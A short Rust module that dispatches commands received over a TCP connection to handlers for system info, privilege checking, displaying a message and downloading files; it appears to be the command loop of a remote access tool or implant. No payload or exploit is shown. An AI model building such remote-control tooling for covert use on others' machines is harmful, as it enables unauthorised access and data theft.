use std::net::TcpStream;

pub mod filesystem;
pub mod system; 

pub fn dispatch(instruct: Vec<&str>, conn: &mut TcpStream) -> Result<bool, String> {    
    match instruct.first() {
        Some(&"q") => Ok(false), 

        // System interaction
        Some(&"sysinfo") => system::sysinfo(conn),
        Some(&"check") => system::check_privileges(conn),
        Some(&"display") => system::display_message(&instruct),

        // FileSystem
        Some(&"download") => filesystem::download(&instruct, conn),

        // No registered command
        _ => Ok(true)
    }
}